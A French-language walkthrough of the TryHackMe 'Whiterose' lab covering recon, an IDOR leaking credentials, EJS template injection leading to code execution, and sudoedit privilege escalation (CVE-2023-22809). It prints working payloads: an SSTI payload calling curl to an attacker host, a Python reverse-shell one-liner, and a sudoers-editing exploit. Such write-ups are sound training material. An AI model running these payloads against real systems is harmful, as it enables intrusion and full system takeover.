**Whiterose — Walkthrough TryHackMe**  
**Room :** Whiterose  
**Lien :** https://tryhackme.com/room/whiterose  
**Difficulté :** Facile  
**Description :**  
Yet another Mr. Robot themed challenge.

# Objectifs pédagogiques
Cette room permet de travailler plusieurs notions clés en pentest :
- Énumération de services réseau
- Exploitation d’une IDOR
- Exploitation SSTI (EJS) → RCE
- Élévation de privilèges via sudoedit (CVE)


⚠️ Ce walkthrough est fourni à des fins éducatives uniquement.
N’effectuez jamais ces techniques sur des systèmes sans autorisation explicite.

# 1. Reconnaissance (Recon)

Après avoir lancé la machine cible et connecté notre VM au réseau TryHackMe via OpenVPN, nous commençons par une phase de reconnaissance avec Nmap.  

### Objectif  
Identifier la surface d’attaque :
- ports ouverts
- services exposés
- système d’exploitation

### Scan réseau : 
```bash
nmap -A -p- -T4 IP_CIBLE
```

### Explication des options
- A : mode agressif (OS detection, traceroute, scripts avancés)
- -p- : scan de tous les ports (1–65535)
- T4 : accélère le scan
- IP_CIBLE : adresse IP de la machine cible

![image](https://github.com/user-attachments/assets/6f175acf-1064-4fba-8dec-4ef9ee972cd2)

### Analyse des services exposés
Ports ouverts :
| Port    | Service   | Intérêt |
|---------|-----------|---------|
| 22      | SSH       | Accès distant (post-exploitation) |
| 80     | HTTP   | Site web nginx 1.14.0 potiellement vulnérable |

### Accès au site

L’accès au site redirige vers `cyprusbank.thm`. 

➡️ Ajout dans /etc/hosts :  
`<IP_CIBLE> cyprusbank.thm`


Le site affiche une page de maintenance.
![image](https://github.com/user-attachments/assets/b5138eab-3ff2-4da3-b4bf-76b9c35f9e3e)

Analyse rapide côté client:
- Aucun JavaScript
- Aucun commentaire HTML
- Pas de page robots.txt
- Peu de ressources chargées
- Aucun résultat avec une énumération gobuster

➡️ Hypothèse : présence d’un sous-domaine non exposé

# 2. Énumération

### Recherche de Vhosts

![image](https://github.com/user-attachments/assets/a3968b74-90c4-4fa5-8e24-3e210ca359f4)

Une énumération des virtual hosts révèle :  
`admin.cyprusbank.thm`

➡️ Ajout dans /etc/hosts puis navigation vers le sous-domaine.

# 3. Accès à l’interface d’administration

Le sous-domaine admin.cyprusbank.thm expose une page de connexion.

![image](https://github.com/user-attachments/assets/b4c265e3-cdf4-499e-95bd-ed4e43cbc23d)

Identifiants fournis par la room :  
`Olivia Cortez : olivi8`

Connexion réussie, mais :
- Accès limité
- Endpoint /settings interdit

# 4. IDOR – Accès à des données sensibles

Sur l’endpoint : `/messages/?c=5`

Le paramètre c est contrôlé côté client.

### Test IDOR
Testons de changer la valeur du paramètre c:  `/messages/?c=20`

➡️ Résultat :
Accès à davantage de messages

Cette manipulation révèle une divulgation d’identifiants sensibles : `Gayle Bev : p~]P@5!6;rs558:q`

# 5. Compte administrateur & surface d’attaque élargie

Connexion avec le compte Gayle Bev :
- Accès à /settings
- Modification des mots de passe utilisateurs

Les mots de passe sont réinjectés côté serveur dans la réponse HTML.  
➡️ Indice fort de SSTI / XSS

# 6. Server-Side Template Injection (SSTI)
Analyse de l’erreur serveur

En supprimant le paramètre `password`, l’application retourne une stack trace complète.

Informations critiques divulguées :
- Backend : Node.js / Express
- Template engine : EJS
- Chemins internes exposés

➡️ Confirmation d’un bug applicatif exploitable

# 7. Validation de la SSTI → RCE
Payload de test SSTI (via Burp Suite) :

``` text
settings[view options][outputFunctionName]=x;
process.mainModule.require('child_process')
.execSync('curl <IP_ATTAQUANT>:8000');
s
```

➡️ Callback reçu
✅ Exécution de commandes confirmée

# 8. Obtention d’un reverse shell

### Payload utilisé

``` python
python3 -c 'import socket,os,pty;
s=socket.socket();
s.connect(("<IP>",1234));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
pty.spawn("sh")'
```

➡️ Shell obtenu
➡️ Stabilisation du shell effectuée

# 9. Accès utilisateur & flag user

Utilisateur courant : web

Flag trouvé : /home/web/user.txt

# 10. Élévation de privilèges – sudoedit (CVE-2023-22809)

### Analyse sudo
sudo -l

### Résultat :
- Droit sudoedit sur un fichier nginx
- Sans mot de passe

Version sudo : 1.9.12p1

➡️ Version vulnérable à CVE-2023-22809

# 11. Exploitation de sudoedit

### Principe
sudoedit permet d’injecter des arguments via la variable EDITOR.

### Exploit
export EDITOR="nano -- /etc/sudoers"
sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm

Ajout dans /etc/sudoers :

web ALL=(ALL) NOPASSWD: ALL

# 12. Accès root
sudo su -

➡️ Accès root obtenu  
➡️ Flag : /root/root.txt

# Conclusion & compétences démontrées

### Vulnérabilités exploitées
- IDOR
- SSTI (EJS) → RCE
- Mauvaise configuration sudo
- CVE-2023-22809 (sudoedit)

### Compétences mises en avant
- Méthodologie pentest
- Web exploitation
- Lecture de stack trace
- Exploitation Node.js / EJS
- Privilege escalation Linux